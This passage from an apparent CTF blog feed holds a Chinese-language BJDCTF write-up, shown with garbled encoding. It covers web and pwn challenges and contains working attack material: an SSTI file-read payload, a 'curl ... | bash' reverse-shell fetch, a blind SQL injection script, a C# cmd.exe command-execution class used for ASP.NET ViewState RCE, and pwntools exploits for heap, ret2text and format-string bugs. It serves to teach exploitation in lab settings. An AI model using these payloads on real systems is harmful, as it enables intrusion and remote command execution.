overlappingcmd_del(0)cmd_add(0x40,flat(0,0xb1,heap_addr+0x18,heap_addr+0x20,heap_addr+0x10))cmd_del(1)cmd_add(0x68,flat('\x00'*0x60,0xb0))cmd_del(2)# gdb.attach(p)# fastbins attack overwrite vtable# _IO_file_jumps = libc.sym['_IO_file_jumps']_IO_2_1_stdin_ = libc.sym['_IO_2_1_stdin_']fake_chunk = _IO_2_1_stdin_ + 160 - 0x3fake_vtable = heap_addr + 0x210one_gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]one_gadget = libc.address + one_gadgets[2]print(hex(_IO_file_jumps))print(hex(_IO_2_1_stdin_))print(hex(fake_vtable))print(hex(one_gadget))cmd_add(0xc0,'')cmd_add(0x60,'')cmd_del(4)cmd_del(1)cmd_del(2)cmd_add(0xc0,flat('\x00'*0x38,0x71,fake_chunk))cmd_add(0xa8,p64(0)*2+p64(one_gadget)*19)payload = '\x00'*3+flat(0,0,0xffffffff,0,0,fake_vtable,0,0,0,0,0,0)cmd_add(0x60,'')# gdb.attach(p)cmd_add(0x63,payload)p.interactive() ÂèÇËÄÉget_headers() silently truncates after a null byte Thinkphp5 ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û‰∫ã‰ª∂ÂàÜÊûêÊä•Âëä]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[BJDCTF_writeup]]></title>
    <url>%2F2020%2F03%2F25%2FBJDCTF_writeup%2F</url>
    <content type="text"><![CDATA[WEBfake googleÂú®Ê≥®ÈáäÈáåÁúãÂ∞±ÊòØSSTI„ÄÇ ‰∏ç‰ºöSSTIÔºåÁõ¥Êé•Âú®ÁΩë‰∏äÊâæpayloadÊâì‰∏ã„ÄÇ 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('/flag').read()&#125;&#125; old-hack‰∏ªÈ°µÁöÑÈªëÈ°µÊèêÁ§∫‰∫ÜÊòØthinkphp5ÔºåÂèàÊï¥Âá∫‰∏Ä‰∏™Êä•ÈîôÈ°µÈù¢ÁúãÂà∞ÂÖ∑‰ΩìÁâàÊú¨ÊòØ5.0.23„ÄÇ ÂèëÁé∞ÊúâRECÊºèÊ¥ûÔºåÁõ¥Êé•Áî®payloadÊâì‰∏ã„ÄÇ https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection duangShellÊèêÁ§∫ÊúâÊ∫êÁ†ÅÊ≥ÑÈú≤Ôºå‰∏ãËΩΩ‰∏ãÊù•Áî®vimÊÅ¢Â§ç„ÄÇÁúãÂà∞ËØªÊñá‰ª∂ÁöÑÂëΩ‰ª§Âè™ËøáÊª§‰∫Ücat„ÄÇ ÂΩìÊó∂ÂÅöÈ¢òÁöÑÊó∂ÂÄôÁõ¥Êé•less /flagOOB(Out of Band)Â∞±ËæìÂá∫flag‰∫ÜÔºåÂÜôwriteupÂ§çÁé∞Êó∂ÂÄôÁúãÂà∞Ëøô‰∏™„ÄÇ„ÄÇ„ÄÇ Âè™Â•ΩËÄÅËÄÅÂÆûÂÆûÁöÑÂèçÂºπshellÔºåÊÉ≥ÁùÄÁî®base32ÊàñËÄÖhexÁºñÁ†Å‰∏Ä‰∏ãÂèçÂºπshellÁöÑÂëΩ‰ª§Ôºå‰ΩÜÂèàÊ≤°base32ÂèàÊ≤°pythonÔºåÂè™Â•Ω‰ΩúÁΩ¢„ÄÇËµ∑‰∏Ä‰∏™linuxÈù∂Êú∫Ôºåpython -m SimpleHTTPServer 8000ÂºÄ‰∏™webÊúçÂä°ÔºåÁõÆÂΩï‰∏ãÊîæ‰∏ÄÂè•ËØùbashÂèçÂºπshell„ÄÇÁî®ÂëΩ‰ª§curl http://174.1.92.51:8000/shell.txt | bashÊù•ÂèçÂºπ„ÄÇ ÁÆÄÂçïÊ≥®ÂÖ•Âú®robots.txtÈáåÁúãËßÅ‰∫Ühint.txtÔºåÁªôÂá∫‰∫ÜsqlËØ≠Âè•„ÄÇ 1select * from users where username=&apos;$_POST[&quot;username&quot;]&apos; and password=&apos;$_POST[&quot;password&quot;]&apos;; ‰ºóÊâÄÂë®Áü•ÔºåctfÊØîËµõÈáåÂè´easyÁöÑÈ¢òÁõÆÈÉΩ‰∏çeasyÔºå‰∏çÂá∫ÊâÄÊñôËÇØÂÆöÊúâËøáÊª§„ÄÇÂÖàÊääÂÖ≥ÈîÆÂ≠óÊâîËøõburpsuiteÈáåË∑ë‰∏ÄË∑ë„ÄÇ ËøáÊª§‰∫ÜÂÖ≥ÈîÆÂ≠óËã•Âπ≤ÔºåÂÖ∂‰∏≠ÂçïÂºïÂè∑‰πüËøáÊª§‰∫ÜÔºå‰ΩÜÊ≤°ËøáÊª§ÂèçÊñúÊù†„ÄÇÁî®Ââ©‰∏ãÊù•ÁöÑÂÖ≥ÈîÆÂ≠óÊûÑÈÄ†‰∏Ä‰∏™ÂèòÁßç‰∏áËÉΩÂØÜÁ†Å„ÄÇ ÁôªÂΩïÊàêÂäüÂè™Âá∫Êù•‰∏ÄÂè•ËØùÔºåÂπ∂Ê≤°ÊúâflagÔºåÂõ†‰∏∫ÂâçÈù¢ÁúãÂà∞ËøáÊª§‰∫Üunion„ÄÅselectÁ≠âÂÖ≥ÈîÆÂ≠óÔºåËÄÉËôë‰∏çËÉΩË∑®Ë°®Êü•ËØ¢‰∫ÜÔºåflagÂèØËÉΩÂ∞±ÊòØÁôªÂΩïÂØÜÁ†Å„ÄÇ‰∏ãÈù¢Áõ¥Êé•‰∏äÁõ≤Ê≥®ËÑöÊú¨„ÄÇ 123456789101112131415161718192021222324252627282930313233343536#! /usr/bin/env python# _*_ coding:utf-8 _*_import requestsimport urllibimport timestart_time = time.time()def words_len(url): values=&#123;&#125; for i in range(1,100): data = &#123;'username':'p3rh4p\\','password':'||length(password)&gt;%s#' %i&#125; geturl = url response = requests.post(geturl,data) if response.content.find('You konw')&gt;0: return idef words(url): payloads = '!"#$%&amp;\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~' words= '' aa = words_len(url) print aa for i in range(1, aa+1): for payload in payloads: data = &#123;'username':'p3rh4p\\','password':'||ascii(substring(password,%s,1))&gt;%s #' %(i,ord(payload))&#125; geturl = url response = requests.post(geturl,data) if response.content.find('You konw')&gt;0: words += payload print words break return wordsif __name__ == '__main__': url='http://827d094a-2833-4bfb-93a2-fb30e06a04f5.node3.buuoj.cn/check.php' result=words(url) print "The current database:"+result Ë∑ëÂá∫Êù•ÁöÑÊòØÂØÜÁ†ÅÔºåÁî®ÂØÜÁ†ÅÁôªÂΩïËé∑Âæóflag„ÄÇ ÂÅáÁå™Â•óÂ§©‰∏ãÁ¨¨‰∏ÄÂç°Âú®http‰ª£ÁêÜÈÇ£‰∏ÄÊ≠•ÔºåGoogleÊâæ‰∫ÜÂæà‰πÖÈÉΩÊ≤°ÊâæÂà∞ÊòØ‰ªÄ‰πàÂ§¥„ÄÇ„ÄÇ 1234567891011121314151617181920212223242526272829303132333435GET /L0g1n.php HTTP/1.1Host: node3.buuoj.cn:26931User-Agent: Mozilla/5.0 (Commodore 64; Commodo 64; Commodo 64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: gem-love.comSender: root@gem-love.comFrom: root@gem-love.comTo: root@gem-love.comReturn-Path: root@gem-love.comDowngraded-From: root@gem-love.comProxy: 203.107.43.165Proxy-Connection: keep-aliveProxy-Connection: 203.107.43.165Proxy-Authenticate: 203.107.43.165Proxy-Authorization: 203.107.43.165Forwarded: for=203.107.43.165;proto=http;by=203.107.43.165X-Forwarded-Host: 203.107.43.165Http-Proxy: 203.107.43.165X-Forwarded-Proto: httpCookie: _ga=GA1.2.580799202.1584770711; _gid=GA1.2.332844867.1584770711; PHPSESSID=rtmk7m1cg7q3jne0ir65hsnva0; time=9584803982; __vgl=1X-Forwarded-For: 203.107.43.165, 203.107.43.165, 203.107.43.165, 203.107.43.165Client-IP: 127.0.0.1X-Http-Forwarded-For: 203.107.43.165X-Requested-With: 203.107.43.165X-Remote-IP: 203.107.43.165X-Originating-IP: 203.107.43.165X-Remote-Addr: 203.107.43.165WL-Proxy-Client-IP: 203.107.43.165Remote-Addr: 203.107.43.165DNT: 1Connection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0 ÊúÄÂêéÁúãÂà´‰∫∫writeupÊòØVia SchroÃàdingerËøôÈ¢òÊ≤°ÊÑèÊÄùÔºåÊêûÂæóËä±ÈáåËÉ°Âì®ÁöÑÔºåÁªìÊûúÂ∞±Âú®cookieÈáåÊîæ‰∏™base64ÁöÑÊó∂Èó¥ÔºåÊääÊó∂Èó¥ÊîπÊàêË¥üÁöÑÂ∞±Âá∫Êù•‰∏™avÂè∑ÔºåÂéªÊâπÁ´ôÁõ∏ÂÖ≥ËßÜÈ¢ë‰∏ãÊâæflag„ÄÇ„ÄÇÂ∞±‰∏çÊîæËøáÁ®ã‰∫Ü xss‰πãÂÖâÊâ´ÁõÆÂΩïÂèëÁé∞‰∫Ü.gitÁõÆÂΩïÔºàÊâ´ÁöÑÊó∂ÂÄôË¶ÅÁ∫øÁ®ãË¶ÅË∞ÉÂ∞è‰∏ÄÁÇπÔºå‰∏çÁÑ∂‰ºöË¢´Âπ≥Âè∞banÊéâÔºâ„ÄÇgithackÁ±ªÂ∑•ÂÖ∑Êé®ËçêÁî®Git_ExtractÔºåÂÖ∂‰ªñÂ∑•ÂÖ∑Êâ´‰∏çÂá∫Êù•ÁöÑÔºåÁî®Ëøô‰∏™ÈÉΩËÉΩÊâ´Âà∞ÔºåÁîöËá≥ÂéÜÂè≤ÁâàÊú¨‰πüËÉΩÊâ´Âá∫Êù•„ÄÇ Â∫èÂàóÂåñxssÁöÑpayloadÂ∞±ËÉΩÊêû‰∏™ÂèçÂ∞ÑÂûãxssÔºåÁåúÊµãÂêéÁ´ØÊúâ‰∏™botËÉΩË¢´‰Ω†Êâìcookie„ÄÇ ‰∫éÊòØÂú®xssÂπ≥Âè∞ÂáÜÂ§áÈìæÊé•ÔºåÊèíËøõÂéªÂáÜÂ§áÊâìcookieÔºåÊó•ÂêéÂèëÁé∞Êâì‰∫Ü‰∏™ÂØÇÂØûÔºåÂè™ÊâìÂà∞‰∫ÜËá™Â∑±ÁöÑcookieÔºå‰ΩÜÊòØÂú®Ëá™Â∑±ÁöÑcookieÈáåÂèëÁé∞‰∫ÜflagÔºåÁúüÊòØÁ•ûÂ•á„ÄÇ Êñá‰ª∂Êé¢ÊµãËøôÈ¢òÂú®ÊØîËµõÁöÑÊó∂ÂÄôÊ≤°ÂÅöÂá∫Êù•ÔºåÁªìÊùüÂêéËØïÁùÄÂ§çÁé∞‰∏ã„ÄÇ Âú®‰∏ªÈ°µÁöÑResponceÈáåÊúâ‰∏™hintÔºöhome.phpÔºåÊòéÊòæÊòØphp‰º™ÂçèËÆÆÁöÑ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ„ÄÇ ËØª‰∏ãÊù•home.phpÂíåsystem.phpÁöÑÊ∫êÁ†Å„ÄÇ home.phpÈáåÊ≤°‰ªÄ‰πà‰∏úË•øÔºåÂ∞±Âè™ËÉΩËØªËøô‰∏§‰∏™Ê∫êÁ†Å„ÄÇ 1234567891011121314151617181920212223242526272829303132333435&lt;?phpsetcookie("y1ng", sha1(md5('y1ng')), time() + 3600);setcookie('your_ip_address', md5($_SERVER['REMOTE_ADDR']), time()+3600);if(isset($_GET['file']))&#123; if (preg_match("/\^|\~|&amp;|\|/", $_GET['file'])) &#123; die("forbidden"); &#125; if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['file']))&#123; die("not now!"); &#125; if(preg_match("/.?a.?d.?m.?i.?n.?/i", $_GET['file']))&#123; die("You! are! not! my! admin!"); &#125; if(preg_match("/^home$/i", $_GET['file']))&#123; die("Á¶ÅÊ≠¢Â•óÂ®É"); &#125; else&#123; if(preg_match("/home$/i", $_GET['file']) or preg_match("/system$/i", $_GET['file']))&#123; $file = $_GET['file'].".php"; &#125; else&#123; $file = $_GET['file'].".fxxkyou!"; &#125; echo "Áé∞Âú®ËÆøÈóÆÁöÑÊòØ ".$file . "&lt;br&gt;"; require $file; &#125;&#125; else &#123; echo "&lt;script&gt;location.href='./home.php?file=system'&lt;/script&gt;";&#125; home.phpÈáåÊúâ‰∏™Êñá‰ª∂ËØªÂèñÔºå‰ΩÜÈôêÊ≠ª‰∫ÜÂè™ËÉΩËØª127.0.0.1ÁöÑÊñá‰ª∂ÔºåÂπ≤ËÑÜssrfËÆøÈóÆ‰∏ãadmin.php 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phperror_reporting(0);if (!isset($_COOKIE['y1ng']) || $_COOKIE['y1ng'] !== sha1(md5('y1ng')))&#123; echo "&lt;script&gt;alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script&gt;"; header("Refresh:0.1;url=index.php"); die;&#125;$str2 = ' Error: url invalid&lt;br&gt;~$ ';$str3 = ' Error: damn hacker!&lt;br&gt;~$ ';$str4 = ' Error: request method error&lt;br&gt;~$ ';?&gt;......&lt;?php$filter1 = '/^http:\/\/127\.0\.0\.1\//i';$filter2 = '/.?f.?l.?a.?g.?/i';if (isset($_POST['q1']) &amp;&amp; isset($_POST['q2']) &amp;&amp; isset($_POST['q3']) ) &#123; $url = $_POST['q2'].".y1ng.txt"; $method = $_POST['q3']; $str1 = "~$ python fuck.py -u \"".$url ."\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;"; echo $str1; if (!preg_match($filter1, $url) )&#123; die($str2); &#125; if (preg_match($filter2, $url)) &#123; die($str3); &#125; if (!preg_match('/^GET/i', $method) &amp;&amp; !preg_match('/^POST/i', $method)) &#123; die($str4); &#125; $detect = @file_get_contents($url, false); print(sprintf("$url method&amp;content_size:$method%d", $detect));&#125;?&gt; post‰∏Ä‰∏ãq1=1&amp;q2=http://127.0.0.1/admin.php?&amp;q3=GETÂèëÁé∞‰∏çË°åÔºåÂéªÁæ§ÈáåÂÅ∑Áúã‰∏ãÂ∏àÂÇÖ‰ª¨ÁöÑËÅäÂ§©ËÆ∞ÂΩïÔºåÂèëÁé∞ËøòÊúâ‰∏™Ê†ºÂºèÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûOrz„ÄÇÁî®q1=1&amp;q2=http://127.0.0.1/admin.php?&amp;q3=GET%1$sÂú®post‰∏Ä‰∏ãÔºåÂ§ÑÂá∫Êù•‰∏Ä‰∏≤admin.phpÁöÑÊ∫êÁ†Å„ÄÇ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phperror_reporting(0);session_start();$f1ag = 'f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;'; //fakefunction aesEn($data, $key)&#123; $method = 'AES-128-CBC'; $iv = md5($_SERVER['REMOTE_ADDR'],true); return base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));&#125;function Check()&#123; if (isset($_COOKIE['your_ip_address']) &amp;&amp; $_COOKIE['your_ip_address'] === md5($_SERVER['REMOTE_ADDR']) &amp;&amp; $_COOKIE['y1ng'] === sha1(md5('y1ng'))) return true; else return false;&#125;if ( $_SERVER['REMOTE_ADDR'] == "127.0.0.1" ) &#123; highlight_file(__FILE__);&#125; else &#123; echo "&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size='10px' color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is " . $_SERVER['REMOTE_ADDR'];&#125;$_SESSION['user'] = md5($_SERVER['REMOTE_ADDR']);if (isset($_GET['decrypt'])) &#123; $decr = $_GET['decrypt']; if (Check())&#123; $data = $_SESSION['secret']; include 'flag_2sln2ndln2klnlksnf.php'; $cipher = aesEn($data, 'y1ng'); if ($decr === $cipher)&#123; echo WHAT_YOU_WANT; &#125; else &#123; die('Áà¨'); &#125; &#125; else&#123; header("Refresh:0.1;url=index.php"); &#125;&#125; else &#123; //I heard you can break PHP mt_rand seed mt_srand(rand(0,9999999)); $length = mt_rand(40,80); $_SESSION['secret'] = bin2hex(random_bytes($length));&#125;?&gt; Âà†Êéâcookie‰∏≠ÁöÑPHPSESSIONÊòéÊñáÂ∞±‰∏∫Á©∫ÔºåÂØÜÈí•Áü•ÈÅìÔºåvi‰πüÁü•ÈÅì‰∫ÜÔºåÂ∞±ËÉΩÂä†ÂØÜÂá∫ÂØÜÊñá„ÄÇ EasyAspDotNetËøôÈ¢òÂú®ÊØîËµõÊó∂ÂÄô‰πüÊ≤°ÂÅöÂá∫Êù•ÔºåÊ†πÊçÆhintÊâæÂà∞‰∫ÜHITCON 2018ÁöÑÁ±ª‰ºº‰∏ÄÈÅìÈ¢òÁõÆÔºåÊ†πÊçÆcykuÂ∏àÂÇÖÁöÑwriteupÂ∞ùËØïpowershellÂèçÂºπshellÂπ∂Ê≤°ÊúâÊàêÂäü„ÄÇÁ≠âÂÆòÊñπwriteupÂá∫Êù•ÁöÑÊó∂ÂÄôÂèàÊòØcykuÂ∏àÂÇÖÁöÑÂèà‰∏ÄÁØáÊñáÁ´†Â§çÁé∞‰∏Ä‰∏ãÔºåcykuÂ∏àÂÇÖÂ§™Âº∫‰∫Ü„ÄÇ ËøõÂéªÁΩëÈ°µÁÇπ‰∏ãClick me!Âá∫Êù•‰∏ÄÂº†ÂõæÁâáÔºåF12ÁúãËßÅÂ∫îËØ•ÊòØÂ≠òÂú®Êñá‰ª∂ËØªÂèñ„ÄÇ Á©øË∂ä‰∫Ü‰∏§‰∏™ÁõÆÂΩïÈ°∫Âà©ËØªÂà∞‰∫Üweb.config„ÄÇ Á¨¨‰∫å‰∏™hintÁöÑVIEWSTATEÊòØ‰ΩøÁî®asp.netÊéß‰ª∂Â∞±‰ºöÊúâÁöÑ‰∏úË•øÔºåÊü•ÈòÖËµÑÊñôÂæóÁü•VIEWSTATEÈÖçÂêàmachineKeyÊòØËÉΩÂ§üRCEÁöÑ„ÄÇ ‰∏ãËΩΩysoserial.exeÔºåÊääC:\Windows\Microsoft.NET\Framework64\v4.0.30319ÁõÆÂΩï‰∏ãÁöÑSystem.dllÂíåSystem.Web.dllÂ§çÂà∂ËøáÊù•Ôºå‰øùÂ≠ò‰ª•‰∏ã‰ª£Á†Å‰∏∫ExploitClass.cs„ÄÇ 123456789101112131415161718192021222324class E&#123; public E() &#123; System.Web.HttpContext context = System.Web.HttpContext.Current; context.Server.ClearError(); context.Response.Clear(); try &#123; System.Diagnostics.Process process = new System.Diagnostics.Process(); process.StartInfo.FileName = "cmd.exe"; string cmd = context.Request.Form["cmd"]; process.StartInfo.Arguments = "/c " + cmd; process.StartInfo.RedirectStandardOutput = true; process.StartInfo.RedirectStandardError = true; process.StartInfo.UseShellExecute = false; process.Start(); string output = process.StandardOutput.ReadToEnd(); context.Response.Write(output); &#125; catch (System.Exception) &#123;&#125; context.Response.Flush(); context.Response.End(); &#125;&#125; Âà©Áî®‰∏äÈù¢ËØªweb.configËé∑ÂèñÂà∞ÁöÑmachineKeyÁî®ysoserial.exeÁîüÊàêVIEWSTATE„ÄÇ 1./ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll" --generator="CA0B0334" -c --validationalg="SHA1" --validationkey="47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9" ÂõûÂà∞‰∏ªÈ°µÁÇπ‰∏ãClick me!ÔºåÂ∞ÜËØ∑Ê±Ç‰∏≠ÁöÑVIEWSTATEÊç¢Êàêysoserial.exeÁîüÊàêÁöÑÔºåÂÜçÂä†‰∏™postÂèÇÊï∞cmdÔºåÂÄº‰∏∫cmdÂëΩ‰ª§„ÄÇ PWNone_gadgetinitÂáΩÊï∞Áõ¥Êé•ËæìÂá∫‰∫ÜprintfÁöÑÂú∞ÂùÄÔºåÈ¢òÁõÆÂêçÂ≠óÂæàÁõ¥Êé•ÔºåÂè´one_gadgetÔºåÂèàÊèê‰æõ‰∫ÜlibcÔºåÁõ¥Êé•one_gadget‰∏ÄÊääÊ¢≠„ÄÇ 123456int init()&#123; setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); return printf("here is the gift for u:%p\n", &amp;printf);&#125; mainÂáΩÊï∞ËøôÈáåÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØÔºöÂ≠òÂú®ÁöÑÊºèÊ¥û‰∏çÊòØÊ†àÊ∫¢Âá∫ÔºåËÄåÁõ¥Êé•Ë∑≥ËΩ¨Âà∞ËæìÂÖ•ÁöÑÂÜÖÂÆπÂ§ÑÊâßË°åÔºåÊâÄ‰ª•Êàë‰ª¨ËæìÂÖ•ÁöÑone_gadgetË¶ÅËΩ¨‰∏∫Êï¥ÂûãÂÜçËΩ¨‰∏∫Â≠óÁ¨¶‰∏≤„ÄÇ 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; ... v6 = __readfsqword(0x28u); init(); printf("Give me your one gadget:", argv); __isoc99_scanf("%ld", &amp;v4); v5 = v4; v4("%ld", &amp;v4); # vuln return 0;&#125; ÈôÑ‰∏äexp 12345678910111213141516171819202122232425262728293031323334from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './one_gadget'if sys.argv[1] == 'l': p = process('./one_gadget') libc = context.binary.libcelse: p = remote('node3.buuoj.cn',26018) libc = ELF('./libc-2.29.so')elf = ELF('./one_gadget')p.recvuntil('u:')data = int(p.recv(14),16)base = data - libc.sym['printf']# one_gadget = base + 0xe237f# one_gadget = base + 0xe2383# one_gadget = base + 0xe2386one_gadget = base + 0x106ef8# one_gadget = base + 0xc83ba# one_gadget = base + 0xc83bd# one_gadget = base + 0xc83c0# one_gadget = base + 0xe652bpayload = str(int(one_gadget))p.recvuntil('gadget:')# gdb.attach(p)p.sendline(payload)p.interactive() r2t3ÊºèÊ¥ûÂú®name_checkÂáΩÊï∞ÈáåÔºåÂèÇÊï∞sÊúÄÂ§öËÉΩËæìÂÖ•Âà∞0x400‰∏™Â≠óËäÇÔºåstrcpyÂà∞destÈáåÂ∞±‰ºöÈÄ†ÊàêÊ†àÊ∫¢Âá∫„ÄÇ 1234567891011121314char *__cdecl name_check(char *s)&#123; char dest; // [esp+7h] [ebp-11h] unsigned __int8 v3; // [esp+Fh] [ebp-9h] v3 = strlen(s); if ( v3 &lt;= 3u || v3 &gt; 8u ) &#123; puts("Oops,u name is too long!"); exit(-1); &#125; printf("Hello,My dear %s", s); return strcpy(&amp;dest, s);&#125; ‰ΩÜÂú®strcpyÂâçÂØπÁöÑÈïøÂ∫¶ËøõË°åÈôêÂà∂Ôºå‰∏çËøá‰ªîÁªÜÁúãÂèëÁé∞ÂØπË∑üv3ÊØîËæÉÁöÑÊï∞Â≠óÁ±ªÂûãÈÉΩÊòØunsigned intÂûãÔºåÂú®Ê±áÁºñÈáå‰πüËÉΩÁúãËßÅÂèñeaxÁöÑ‰Ωé‰ΩçË∑ü3Âíå8ÊØîËæÉÔºåÊâÄ‰ª•Âè™Ë¶Å‰ª§Âà∞sÁöÑÈïøÂ∫¶Âú®0xx04Âà∞0xx07‰πãÈó¥Â∞±ËÉΩÁªïËøá‰∫Ü„ÄÇ ÊúÄÂêéret2textÂà∞È¢ÑÁïôÁöÑbackdoorÂ∞±Ë°å„ÄÇÈôÑ‰∏äexp 123456789101112131415161718192021from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './r2t3'if sys.argv[1] == 'l': p = process('./r2t3')else: p = remote('node3.buuoj.cn',29906)elf = ELF('./r2t3')backdoor = elf.sym['_dl_registery']payload = flat(cyclic(21),backdoor,cyclic(235)+'\x00')p.recvuntil('[+]Please input your name:')# gdb.attach(p)p.send(payload)p.interactive() r2t4ËøôÈ¢òÂºÄ‰∫ÜcanaryÔºå‰ΩÜÂ≠òÂú®Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÔºåcarrayÂπ∂Ê≤°Êúâ‰ªÄ‰πàÂçµÁî®„ÄÇ ‰∏çËøáËøôÈáåÁöÑÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤Ê≤°ÊúâÂæ™ÁéØÔºåÂ∞ùËØïË¶ÜÂÜô.fini_arrayÈáåÂáΩÊï∞ÁöÑgotË°®Ôºå‰ΩÜÊ≤°ÊúâÊàêÂäü„ÄÇÊúÄÂêéÊïÖÊÑèÊ†àÊ∫¢Âá∫ÔºåËÆ©Á®ãÂ∫èË∞ÉÁî®___stack_chk_failÔºåË¶ÜÂÜô___stack_chk_failÁöÑgot‰ΩøÂæóÁ®ãÂ∫èË∑≥ËΩ¨Âà∞backdoor„ÄÇ 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [rsp+0h] [rbp-30h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); read(0, &amp;buf, 0x38uLL); printf(&amp;buf, &amp;buf); return 0;&#125; ÈôÑ‰∏äexp 123456789101112131415161718192021222324252627282930from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './r2t4'if sys.argv[1] == 'l': p = process('./r2t4')else: p = remote('node3.buuoj.cn',28071)elf = ELF('./r2t4')addr = elf.got['__stack_chk_fail']backdoor = elf.sym['backdoor']def exec_fmt(payload): p = process('./r2t4') p.sendline(payload) data = p.recvline() p.close() return dataautofmt = FmtStr(exec_fmt)offset = autofmt.offsetpayload = fmtstr_payload(offset,&#123;addr:backdoor&#125;).ljust(0x38,'a')# gdb.attach(p)p.send(payload)p.interactive() testÁ®ãÂ∫è‰øùÊä§ÂÖ®ÂºÄÔºåÂ•ΩÂÉèÊ≤°‰ªÄ‰πàÊºèÊ¥ûÔºåÂ∞ùËØïÁªïËøáËøáÊª§„ÄÇÊâæ‰∫ÜÂæà‰πÖÂèëÁé∞od ????ÂèØ‰ª•Ôºå‰ΩÜÊòØÂá∫Êù•ÁöÑÊòØËøô‰∫õÁé©ÊÑèÔºåÁõ¥Êé•Ëß£Á†Å‰∏çË°å„ÄÇÊÉ≥ÂæóÂ§¥ÈÉΩÁ©ø‰∫ÜÔºåÂ∑ÆÁÇπË¶ÅÂÜôËÑöÊú¨ÁàÜÁ†¥‰∫Ü„ÄÇ ÂêéÊù•Áúã‰∫ÜÂÆòÊñπÊñáÊ°£ÊâçÁü•ÈÅìÔºåÈªòËÆ§‰∏§‰∏™Â≠óËäÇÂêàËµ∑Êù•ËΩ¨‰∏∫ÂÖ´ËøõÂà∂„ÄÇÁî®ËÑöÊú¨Ëß£‰∏Ä‰∏ã„ÄÇ 1234567891011e = '066146 063541 063173 034461 030141 033470 026546 063067 030545 032055 030143 026471 061471 033471 034455 034470 032064 033544 032071 032467 076463 077412 046105 001106 000401 000000 000000 000000 000000 001000 037000 000400 000000 000000 040006 000000 000000 040000 000000 000000 000000 014000 000033 000000 000000 000000 000000 040000 034000 004400 040000 017400 016000 003000 000000 002400 000000 040000 000000 000000 000000 040000 040000 000000 000000 040000 040000 000000 000000 174000 000001 000000 000000 174000 000001 000000 000000 004000 000000 000000 000000 001400 000000 002000 000000 034000 000002 000000 000000 034000 040002 000000 000000 034000 040002 000000 000000 016000 000000 000000 000000 016000 000000 000000 000000 000400 000000 000000 000000 000400 000000 002400 000000 000000 000000 000000 000000 000000 040000 000000 000000 000000 040000 000000 000000 132000 000013 000000 000000 132000 000013 000000 000000 000000 020000 000000 000000 000400 000000 003000 000000 010000 000016 000000 000000 010000 060016 000000 000000 010000 060016 000000 000000 054000 000002 000000 000000 060000 000002 000000 000000 000000 020000 000000 000000 001000 000000 003000 000000 024000 000016 000000 000000 024000 060016 000000 000000 024000 060016 000000 000000 150000 000001 000000 000000 150000 000001 000000 000000 004000 000000 000000 000000 002000 000000 002000 000000 052000 000002 000000 000000 052000 040002 000000 000000 052000 040002 000000 000000 042000 000000 000000 000000 042000 000000 000000 000000 002000 000000 000000 000000 050000 072345 002144 000000 104000 000012 000000 000000 104000 040012 000000 000000 104000 040012 000000 000000 032000 000000 000000 000000 032000 000000 000000 000000 002000 000000 000000 000000 050400 072345 003144 000000 000000 000000 000000 000000 000000 000000 000000 000000 000000 000000 000000'e = e.split(' ')ans = ''for o in e: ans += hex(int(o,8))[2:][2:] ans += hex(int(o,8))[2:][:2]ans = ans.split('0a')[0]print(ans.decode('hex')) diffgdbÈÄÄ‰∫ÜÂá†Ê¨°ÂÜçËøõÂéªÁúãÂà∞diffÈáåÊñá‰ª∂‰∫åÁöÑÊ†àÂú∞ÂùÄÈÉΩÊòØ‰∏ÄÊ†∑ÁöÑÔºåÊàëÈ¨º‰ΩøÁ•ûÂ∑ÆÁöÑ‰ª•‰∏∫‰ªñÊ†àÂú∞ÂùÄÊòØ‰∏çÂèòÁöÑÔºågdbÈáåËÉΩgetshellÔºåÂëΩ‰ª§Ë°åÈáåÊâßË°åÂ∞±‰∏çË°å„ÄÇ„ÄÇÊúâÊ≤°ÊúâÂ∏àÂÇÖÁü•ÈÅìÊòØ‰∏∫‰ªÄ‰πà„ÄÇ„ÄÇ 